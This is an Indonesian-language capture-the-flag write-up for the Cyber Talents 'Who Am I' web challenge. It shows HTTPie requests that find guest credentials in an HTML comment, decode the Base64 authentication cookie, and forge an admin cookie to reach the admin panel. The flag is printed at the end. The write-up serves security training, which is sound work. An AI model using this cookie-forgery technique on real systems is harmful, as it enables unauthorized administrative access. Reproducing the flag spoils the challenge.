## [Writeup] Cyber Talents: Who Am I


Tutorial kali ini akan membahas solusi untuk soal latihan [Cyber Talents: Who Am I](https://cybertalents.com/challenges/web/who-am-i) yang merupakan soal kategori web security. Berikut ini adalah penjelasan untuk soal tersebut:

```
Do not Start a fight you can not stop it
```

Adapun soal tersebut dapat diakses pada [tautan ini](http://34.76.107.218/whoami/). Untuk mengerjakan soal ini, kita akan menggunakan [HTTPie](https://httpie.org/), namun Anda juga dapat menggunakan aplikasi lainnya sesuai keinginan. Langsung saja, kita akan mengirimkan _request_ ke halaman soal tersebut:

```bash
% http "http://34.76.107.218/whoami/"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Mon, 27 Jul 2020 04:41:04 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

<html>
<title>Administrator Panel</title>

<CENTER>
<html>
<title>Administrator Panel</title>
<link href="http://fonts.googleapis.com/css?family=Patua+One" rel="stylesheet" type="text/css">
<font face="Patua One">
    <br><br><br>
        <font face="Patua One"><p style="font-size:25px">Please Enter Your Username and Password !!</p></font>
                <CENTER>
    <form method="POST">
            <fieldset style="width:400px;border: 2px solid #486f9a;border-radius: 5px;padding: 10px;">
                <label for="user">Username:</label>
                <input type="Text" name="user" id="user" autocomplete="off"><br><br>
                <label for="user">Password:</label>
                <input type="Password" name="pass" id="pass" autocomplete="off"><br><br>
                <input type="submit" value="Submit">
            </fieldset><br><br>
        </form>

                <!--
                        Guest Account:
                        -=-=-=-=-=-=-=-
                        Username:Guest
                        Password:Guest
                -->
```

Bisa terlihat bahwa pada kode sumber halaman tersebut terdapat **Username** dan **Password** yang keduanya adalah **Guest**. Selanjutnya, kita akan menggunakan username dan password tersebut pada _request_ ke halaman yang sama:

```bash
% http -f "http://34.76.107.218/whoami/" "user=Guest" "pass=Guest"
HTTP/1.1 302 Found
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
Date: Mon, 27 Jul 2020 04:53:44 GMT
Location: admin.php
Server: nginx/1.10.3 (Ubuntu)
Set-Cookie: Authentication=bG9naW49R3Vlc3Q%3D
Transfer-Encoding: chunked

<html>
<title>Administrator Panel</title>

<CENTER>
<html>
<title>Administrator Panel</title>
<link href="http://fonts.googleapis.com/css?family=Patua+One" rel="stylesheet" type="text/css">
<font face="Patua One">
    <br><br><br>
        <font face="Patua One"><p style="font-size:25px">Please Enter Your Username and Password !!</p></font>
                <CENTER>
    <form method="POST">
            <fieldset style="width:400px;border: 2px solid #486f9a;border-radius: 5px;padding: 10px;">
                <label for="user">Username:</label>
                <input type="Text" name="user" id="user" autocomplete="off"><br><br>
                <label for="user">Password:</label>
                <input type="Password" name="pass" id="pass" autocomplete="off"><br><br>
                <input type="submit" value="Submit">
            </fieldset><br><br>
        </form>

                <!--
                        Guest Account:
                        -=-=-=-=-=-=-=-
                        Username:Guest
                        Password:Guest
                -->
```

Perhatikan _header_ yang diberikan oleh server pada _request_ di atas:

```bash
Location: admin.php
Set-Cookie: Authentication=bG9naW49R3Vlc3Q%3D
```

Bisa terlihat, bahwa server tersebut akan mengarahkan kita ke halaman **admin.php** dan memberikan _cookie_ dalam format Base64. Jika kita decode _cookie_ tersebut, maka hasilnya seperti ini:

```bash
% echo -n "bG9naW49R3Vlc3Q=" | base64 -d
login=Guest
```

Coba kita ubah _cookie_ login tersebut dari **Guest** menjadi **admin**:

```bash
% echo -n "login=admin" | base64
bG9naW49YWRtaW4=
```

Selanjutnya adalah mengirimkan _request_ menggunakan _cookie_ yang telah dimodifikasi tersebut:

```bash
% http -f "http://34.76.107.218/whoami/admin.php" "Cookie:Authentication=bG9naW49YWRtaW4="
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Mon, 27 Jul 2020 04:56:45 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

<html>
<title>Administrator Panel</title>

<link href="http://fonts.googleapis.com/css?family=Patua+One" rel="stylesheet" type="text/css">
<font face="Patua One">
    <br>
        <font face="Patua One"><p style="font-size:25px">&emsp;&emsp;&emsp;&emsp;&emsp;Welcome, Administrator !</p></font>
                <CENTER>
   <br><br><font face="tahoma" color="red">Congratulation.</font> <font face="tahoma">Your Flag iS : </font><br>


   <p style="font-size:20px">FLag{B@D_4uTh1Nt1C4Ti0n}</p>
```

Ternyata berhasil, dan flagnya adalah `FLag{B@D_4uTh1Nt1C4Ti0n}`. Sekian tutorial singkat kali ini, semoga bermanfaat. Terima kasih kepada Allah SWT, dan Anda yang telah membaca tutorial ini.
